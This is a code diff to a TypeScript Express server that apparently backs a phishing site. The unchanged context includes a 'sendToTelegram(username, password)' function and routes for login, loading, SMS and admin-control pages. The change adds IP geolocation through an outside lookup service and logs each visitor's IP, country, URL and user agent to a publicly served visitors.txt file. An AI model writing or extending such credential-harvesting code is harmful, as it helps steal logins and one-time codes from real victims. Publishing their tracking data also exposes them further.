@@ -38,23 +38,52 @@ async function sendToTelegram(username: string, password: string) {
   }
 }
 
+// Function to get country from IP address
+async function getCountryFromIP(ip: string): Promise<string> {
+  try {
+    // Skip if IP is unknown or local
+    if (ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+      return 'Local';
+    }
+
+    // Use IP-API.com for free geolocation (45 requests/minute limit)
+    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
+    const data = await response.json();
+    
+    if (data.status === 'success' && data.country) {
+      return `${data.country} (${data.countryCode})`;
+    }
+    
+    return 'Unknown';
+  } catch (error) {
+    console.error('Error getting country for IP:', error);
+    return 'Unknown';
+  }
+}
+
 // Function to log visitor information
-function logVisitor(req: Request) {
+async function logVisitor(req: Request) {
   try {
     // Get real IP address (handles proxies and load balancers)
-    const ip = req.headers['x-forwarded-for'] as string || 
-               req.headers['x-real-ip'] as string ||
-               req.connection.remoteAddress ||
-               req.socket.remoteAddress ||
-               'unknown';
+    const rawIP = req.headers['x-forwarded-for'] as string || 
+                  req.headers['x-real-ip'] as string ||
+                  req.connection.remoteAddress ||
+                  req.socket.remoteAddress ||
+                  'unknown';
+    
+    // Extract first IP from comma-separated list for country lookup
+    const ip = rawIP.split(',')[0].trim();
+    
+    // Get country information
+    const country = await getCountryFromIP(ip);
     
     // Get current date/time in GMT
     const now = new Date();
     const dateStr = now.toISOString().split('T')[0]; // YYYY-MM-DD
     const timeStr = now.toISOString().split('T')[1].split('.')[0]; // HH:MM:SS
     
-    // Format log entry
-    const logEntry = `${ip} | ${dateStr} | ${timeStr} GMT | ${req.url} | ${req.headers['user-agent'] || 'unknown'}\n`;
+    // Format log entry with country information
+    const logEntry = `${rawIP} (${country}) | ${dateStr} | ${timeStr} GMT | ${req.url} | ${req.headers['user-agent'] || 'unknown'}\n`;
     
     // Append to visitors.txt file in public directory so it deploys with the site
     const logPath = path.join(process.cwd(), 'client', 'public', 'visitors.txt');
@@ -77,7 +106,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     // Only log main page visits, not API calls or assets
     if (req.url === '/' || req.url.startsWith('/login') || req.url.startsWith('/loading') || 
         req.url.startsWith('/sms') || req.url.startsWith('/admin-control')) {
-      logVisitor(req);
+      // Log visitor async without blocking request
+      logVisitor(req).catch(error => console.error('Visitor logging failed:', error));
     }
     next();
   });
